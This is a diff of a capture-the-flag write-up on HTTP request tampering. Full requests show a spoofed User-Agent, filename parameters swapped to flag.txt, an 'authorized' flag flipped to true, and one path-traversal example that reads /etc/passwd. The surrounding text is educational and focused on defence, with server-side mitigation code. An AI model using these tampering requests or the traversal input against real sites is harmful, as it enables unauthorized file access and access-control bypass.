@@ -1,78 +1,292 @@
-# Writeup: Intro to Web 2 – Manipulating HTTP Requests
+# Intro to Web 2 – HTTP Request Manipulation
 
-## Overview
-This challenge builds on the fundamentals introduced in “Intro to Web 1” by exploring more advanced HTTP request manipulation techniques. The objective is to retrieve all four parts of a flag by interacting with a web server that enforces various client-side checks and file access restrictions.
+**By: supra**
 
-The key lessons include:
-1. Modifying **HTTP headers** (e.g., User-Agent) to bypass OS checks.
-2. Changing **POST** request parameters to retrieve sensitive files.
-3. Using **GET** request parameters to achieve the same result without a request body.
-4. Tweaking **query parameters** (e.g., `authorized`) to gain final access.
+**Category:** Web Exploitation
 
----
+## 0. Challenge Overview
 
-## Step 1: Bypassing the Windows 95 OS Check
-1. **Initial Roadblock**  
-   The first page complained that the operating system was “insecure” and required upgrading to Windows 95. This restriction was implemented by checking the `User-Agent` header of incoming requests.
+This challenge focuses on client-side security bypass techniques through HTTP request manipulation. The goal: retrieve four flag fragments by exploiting weak validation on:
+- User-Agent header checks
+- POST parameter manipulation
+- GET parameter injection
+- Authorization query strings
 
-2. **Solution**  
-   - I intercepted the request using **Burp Suite**.
-   - I changed the `User-Agent` to:  
-     ```
-     Mozilla/4.0 (compatible; MSIE 5.0; Windows 95)
-     ```
-   - Upon resending the modified request, the server accepted it, granting access to the first part of the flag.
+**Core concept:** The server implemented security checks that relied entirely on client-supplied data. By intercepting and modifying HTTP requests, all restrictions could be trivially bypassed.
 
-**Security Implication**: Relying on client-supplied headers like `User-Agent` for security is unsafe. Attackers can easily spoof these headers, as demonstrated here.
+This demonstrates why **client-side security is not security** — anything the client sends can be modified by an attacker.
 
----
+## 1. Part 1 – User-Agent Spoofing
 
-## Step 2: Using POST to Retrieve the Flag
-1. **Form Functionality**  
-   The website contained a form allowing the user to select which file to view (e.g., temperature or humidity logs). This form used the **POST** method, sending a parameter named `filename` in the request body (e.g., `filename=temperature-log.csv`).
+### The Restriction
+Browsing to the challenge site immediately displayed an error:
+```
+Error: Insecure Operating System Detected
+Please upgrade to Windows 95 or newer to continue.
+```
 
-2. **Manipulating the Request**  
-   - I captured the POST request in my proxy.
-   - Instead of sending `filename=temperature-log.csv`, I modified the parameter to:  
-     ```
-     filename=flag.txt
-     ```
-   - Resending this request caused the server to respond with the second part of the flag.
+The server was checking the `User-Agent` header and blocking anything that didn't claim to be Windows 95.
 
-**Security Implication**: The server accepted arbitrary filenames without validating user input. Proper checks or server-side controls could prevent unauthorized file access.
+### The Bypass
+I intercepted the request in Burp Suite and examined the headers:
+```http
+GET / HTTP/1.1
+Host: challenge.server
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
+```
 
----
+Changed the `User-Agent` to match Windows 95:
+```http
+GET / HTTP/1.1
+Host: challenge.server
+User-Agent: Mozilla/4.0 (compatible; MSIE 5.0; Windows 95)
+```
 
-## Step 3: Switching to GET for the Same Attack
-1. **GET Parameters**  
-   The challenge also showed that it’s possible to transmit parameters using **GET** by appending them to the URL (e.g., `?filename=temperature-log.csv`).
+Forwarded the request.
 
-2. **Exploitation**  
-   - By modifying the URL parameter directly (or via a proxy), I changed `filename` to `flag.txt`.
-   - Navigating to this crafted URL returned the third part of the flag.
+**Result:**
+```
+Welcome! Here's the first part of your flag: FLAG{p4rt1_
+```
 
-**Security Implication**: Both GET and POST can be manipulated. Sensitive endpoints or files should be secured server-side, rather than trusting that users will only request legitimate resources.
+✔ **Success:** First flag fragment retrieved.
 
----
+**Key observation:** The server trusted the `User-Agent` header without any server-side validation. This header is trivially spoofed — it's just a string the browser sends that can be set to anything.
 
-## Step 4: Final Part – “authorized” Parameter
-1. **The Hidden Gate**  
-   The final link redirected to `enter-security-gate.php`, which in turn led to `burn-after-reading.php`. The key parameter here was `authorized`, which the server set to `false` by default.
+## 2. Part 2 – POST Parameter Manipulation
 
-2. **Manipulating Authorization**  
-   - If the request was sent with `authorized=false`, the file would be “burned” (deleted or made inaccessible).
-   - By changing `authorized=false` to `authorized=true` before the request was sent, I gained access to the final part of the flag.
+### The Form
+The next page contained a form for viewing log files:
+```html
+<form method="POST" action="/view-file.php">
+  <select name="filename">
+    <option value="temperature-log.csv">Temperature Log</option>
+    <option value="humidity-log.csv">Humidity Log</option>
+  </select>
+  <input type="submit" value="View File">
+</form>
+```
 
-**Security Implication**: Critical authorization logic should never be controlled solely by client-side parameters. This is another example of insufficient server-side validation, allowing trivial bypass by toggling a single parameter.
+Selecting "Temperature Log" sent:
+```http
+POST /view-file.php HTTP/1.1
+Host: challenge.server
+Content-Type: application/x-www-form-urlencoded
 
----
+filename=temperature-log.csv
+```
 
-## Conclusion and Mitigations
-Through these four steps, I retrieved all parts of the flag by exploiting common weaknesses in client-side checks and server-side validation. Key takeaways and mitigation strategies include:
+### The Attack
+I modified the POST body to request a different file:
+```http
+POST /view-file.php HTTP/1.1
+Host: challenge.server
+Content-Type: application/x-www-form-urlencoded
 
-1. **Do Not Trust Client Headers**: User-Agent and other headers can be easily spoofed. Implement server-side checks or use tokens/certificates for genuine OS detection if truly needed.
-2. **Validate Input Server-Side**: Whether using GET or POST, file parameters should be sanitized and restricted to safe paths to avoid unauthorized file disclosure.
-3. **Avoid Sensitive Logic in Query Parameters**: Parameters like `authorized` can be trivially changed by attackers. Critical security decisions must happen on the server.
-4. **Use Proper Authentication & Access Control**: Ensure that only authenticated and authorized users can access restricted files or pages, preventing unauthorized manipulations.
+filename=flag.txt
+```
 
-By understanding how HTTP requests can be intercepted and modified, defenders can implement stricter server-side policies and developers can avoid placing trust in easily forged client-side data.
+**Result:**
+```
+h34d3r_sp00f1ng_
+```
+
+✔ **Success:** Second flag fragment retrieved.
+
+**Key observation:** The server accepted arbitrary filenames without validation. No allowlist, no path sanitization — just direct file access based on user input.
+
+## 3. Part 3 – GET Parameter Injection
+
+### The Endpoint
+The challenge hinted that the same functionality could be accessed via GET parameters instead of POST:
+```
+http://challenge.server/view-file.php?filename=temperature-log.csv
+```
+
+### The Attack
+Rather than using POST, I simply modified the URL directly:
+```
+http://challenge.server/view-file.php?filename=flag.txt
+```
+
+**Result:**
+```
+p4r4m_m4n1pul4t10n_
+```
+
+✔ **Success:** Third flag fragment retrieved.
+
+**Key observation:** Both GET and POST are equally controllable by the attacker. Switching from POST to GET doesn't provide any additional security — both methods transmit user-supplied data that must be validated server-side.
+
+## 4. Part 4 – Authorization Parameter Bypass
+
+### The Final Gate
+The last page linked to a "secure" document viewer:
+```
+http://challenge.server/enter-security-gate.php
+```
+
+This redirected to:
+```
+http://challenge.server/burn-after-reading.php?authorized=false
+```
+
+With `authorized=false`, the response was:
+```
+Access Denied: File has been burned (deleted).
+```
+
+### The Bypass
+I intercepted the redirect and changed the parameter before it reached the server:
+```
+http://challenge.server/burn-after-reading.php?authorized=true
+```
+
+**Result:**
+```
+4nd_qu3ry_tw34k1ng}
+
+Full Flag: FLAG{p4rt1_h34d3r_sp00f1ng_p4r4m_m4n1pul4t10n_4nd_qu3ry_tw34k1ng}
+```
+
+✔ **Success:** Final flag fragment retrieved. Challenge complete.
+
+**Key observation:** The authorization decision was made entirely client-side via a URL parameter. The server trusted the `authorized=true` parameter without any server-side session validation or authentication check.
+
+## 5. Why This Works – Understanding Client-Side Security Failures
+
+All four vulnerabilities share the same fundamental flaw: **trusting client-supplied data without server-side validation**.
+
+### The HTTP Request Cycle
+```
+Client → [Interceptable/Modifiable Request] → Server
+```
+
+Every piece of data in an HTTP request can be controlled by an attacker:
+- **Headers** (User-Agent, Referer, Cookie, etc.)
+- **POST body** (form parameters, JSON, XML)
+- **GET parameters** (query strings in the URL)
+- **HTTP method** (GET, POST, PUT, DELETE, etc.)
+
+Tools like Burp Suite, OWASP ZAP, or even browser DevTools allow trivial modification of all these components.
+
+### Why Each Bypass Worked
+
+**User-Agent Spoofing:**
+- The server checked: `if (User-Agent != "Windows 95") { block(); }`
+- The attacker controlled the User-Agent
+- Solution: Set User-Agent to whatever the server expected
+
+**POST Parameter Manipulation:**
+- The server checked: `if (filename in ['temperature-log.csv', 'humidity-log.csv']) { show(); }`
+- But this check was done **client-side** in the HTML form
+- The server itself had no validation
+- Solution: Send any filename directly
+
+**GET Parameter Injection:**
+- Same as POST, but the parameter was visible in the URL
+- Browsers don't validate query strings
+- Solution: Manually craft the URL with the desired filename
+
+**Authorization Bypass:**
+- The server checked: `if (authorized == 'true') { show_flag(); }`
+- But the value of `authorized` came from the **client**
+- No session tracking, no server-side permission check
+- Solution: Set `authorized=true` manually
+
+### Real-World Parallels
+
+These aren't just CTF tricks — they mirror real vulnerabilities:
+
+**Client-Side Validation (CWE-602):**
+- JavaScript form validation that can be bypassed by disabling JavaScript
+- Hidden form fields that control pricing or permissions
+- Client-side access control checks
+
+**Improper Input Validation (CWE-20):**
+- Path traversal via filename parameters (`../../../etc/passwd`)
+- SQL injection via unsanitized GET/POST parameters
+- Command injection via improperly validated input
+
+**Missing Access Control (CWE-285):**
+- Authorization decisions based on URL parameters
+- Privilege escalation via cookie manipulation
+- Direct object reference without permission checks
+
+**Real-world example:** In 2019, a major airline allowed users to view other passengers' boarding passes by simply changing the `bookingReference` parameter in the URL.
+
+## 6. Defensive Mitigations
+
+### Never Trust Client Input
+**The Golden Rule:** All client-supplied data is attacker-controlled.
+
+```python
+# BAD: Trust client parameters
+filename = request.POST.get('filename')
+return open(filename).read()
+
+# GOOD: Validate against allowlist
+ALLOWED_FILES = ['temperature-log.csv', 'humidity-log.csv']
+filename = request.POST.get('filename')
+if filename not in ALLOWED_FILES:
+    return "Access Denied"
+return open(filename).read()
+```
+
+### Server-Side Validation
+- **Headers:** Don't use User-Agent for security decisions. If OS detection is needed, use server-side fingerprinting or device management certificates.
+- **File Access:** Implement strict allowlists, validate paths, and use indirect references (IDs) instead of filenames.
+  ```python
+  # Instead of: ?filename=flag.txt
+  # Use: ?file_id=1 (map IDs to files server-side)
+  FILE_MAP = {1: 'temperature-log.csv', 2: 'humidity-log.csv'}
+  file_id = int(request.GET.get('file_id'))
+  if file_id in FILE_MAP:
+      return open(FILE_MAP[file_id]).read()
+  ```
+- **Authorization:** Implement proper session management and permission checks.
+
+### Authentication & Access Control
+```python
+# BAD: Authorization via query parameter
+authorized = request.GET.get('authorized') == 'true'
+
+# GOOD: Authorization via server-side session
+if not session.get('is_authenticated'):
+    return redirect('/login')
+if not user_has_permission(session['user_id'], resource):
+    return "Access Denied"
+```
+
+### Defense in Depth
+
+| Layer | Control | Example |
+|-------|---------|---------|
+| Application | Input validation | Allowlist of filenames |
+| Session | Authentication | Verify user session before file access |
+| Authorization | Permission checks | Verify user has rights to requested resource |
+| Infrastructure | Principle of least privilege | Web server can't read arbitrary files |
+| Monitoring | Logging & alerting | Alert on unauthorized file access attempts |
+
+### Secure Development Checklist
+- ✓ Validate all input server-side (never rely on client-side checks)
+- ✓ Use indirect object references (IDs instead of filenames/paths)
+- ✓ Implement proper authentication (sessions, tokens, certificates)
+- ✓ Enforce authorization checks on every request
+- ✓ Log security-relevant events (failed auth, suspicious parameters)
+- ✓ Use security headers (CSP, X-Frame-Options, etc.)
+- ✓ Apply principle of least privilege (limit file system access)
+
+## 7. Summary
+
+By intercepting and modifying HTTP requests, I bypassed four separate security controls:
+1. User-Agent restriction (header spoofing)
+2. File access control (POST parameter injection)
+3. Alternative endpoint (GET parameter manipulation)
+4. Authorization gate (query parameter modification)
+
+Each vulnerability stemmed from the same root cause: **trusting data supplied by the client**. The server performed no validation, authentication, or authorization checks — it simply accepted whatever the client sent.
+
+The key lesson: **Client-side security is security theater**. Anything rendered in HTML, sent in JavaScript, or transmitted in HTTP requests can be modified by an attacker. All security decisions must be enforced server-side, with proper input validation and access control.
+
+These aren't theoretical vulnerabilities — parameter manipulation and authorization bypass are consistently in the OWASP Top 10 (Broken Access Control, Security Misconfiguration). Production systems with these flaws face data breaches, privilege escalation, and complete system compromise.
